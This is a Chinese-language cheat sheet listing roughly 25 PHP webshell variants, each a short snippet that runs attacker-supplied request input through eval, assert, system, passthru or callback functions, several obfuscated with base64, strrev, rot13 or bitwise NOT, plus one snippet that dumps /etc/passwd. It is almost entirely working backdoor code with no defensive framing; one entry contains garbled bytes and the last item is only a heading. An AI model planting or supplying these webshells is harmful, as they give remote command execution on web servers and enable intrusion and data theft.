#### webshell种类 

1._GET变量

```php 
<?=`$_GET[0]`;
```

2._POST变量 

```php  
<?=eval($_POST[0]);?>
```

3.函数变量 

usort函数  *

```php 
<?php usort(...$_GET);
```

include函数 

```php  
<?php
@include($_GET['bug']);
?>
```

getenv函数 

```php  
<?php
eval(getenv('HTTP_CODE'));
?>
```

str_rot13函数 

```php  
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
```

4.system函数 

``` php 
<?php  system($_GET["0"]);
```

5.assert函数 

```php 
<?php assert($_POST[sb]);?>
```

6.多个_GET 或 _POST 

```php  
<?php $_GET[a]($_GET[b]);?>
```

```php  
<?$_POST['sa']($_POST['sb']);?>
```

```php 
<?php
$_REQUEST['a']($_REQUEST['b']);
?>
```

7.REQUEST变量 

```php 
<?php eval($_REQUEST['c'])?>
```
8 . .号变形 

```php 
<?php $c='ass'.'ert';$c($_POST[4]);?>
```

9 _FILE变量 

```php  
<?php
    @eval($_FILE['name']);
?>
```

10 _SERVER变量

```php 
<?php
eval($_SERVER['HTTP_E1044']);
?>
```

11  ~取反 

```php 
 <?php $x=~������;$x($_POST['root']); ?>
```

https://zhuanlan.zhihu.com/p/19670117

12 _GLOBALS变量 

```php  
<?php
    @eval($GLOBALS['_POST']['op']);
?>
```

13 file_get_contents函数 

```php  
<?php
	eval(file_get_contents('wu.txt'));
?>
```

14 call_user_func函数 

```php  
<?php
    call_user_func('echo',$_POST['x']);
?>
```

15 base64编码 

```php  
<?php $x=base64_decode("YXNzZXJ0");$x($_POST['c']);?>
```

16 passthru函数 

```php 
<?php passthru($_POST[1])?>
<?php echo 'A PHP Test ';
```

17 arrmap 函数  array_fileter函数

```php 
<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
```

```php  
<?php
    array_filter(array($_POST['x']),'assert');
?>
```

18 正则匹配类

preg_replace/ mb_ereg_replace/preg_filter等

19 文件包含类

include/include_once/require/require_once/file_get_contents

20 函数泄露敏感信息 

```php 
<?php
  echo "<pre>".file_get_contents( "/etc/passwd" )."<pre>";
?>
```

21 ob_start 

```php  
<?php
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>
```

22 反射型

```php  
<?php 
$s = new ReflectionFunction("assert");
@$s -> invoke($_POST["cmd"]);
?>
```

23 base64加密型

```php 
<?php $a = (strrev(';))"==wOp0lIwIyWUV0RfRCKtVGdzl3c"(edoced_46esab(lave'));
echo $a; ?>
```

24 混合 

``` php 
<?php
 //pwd=jc 
 $a=@strrev(ecalper_gerp); 
 $b=@strrev(edoced_46esab);  
 echo @$a($b(L3h4L2Ug),$_POST[jc],axxa); //    /xx/e
?>
```

25 Shell_Exec
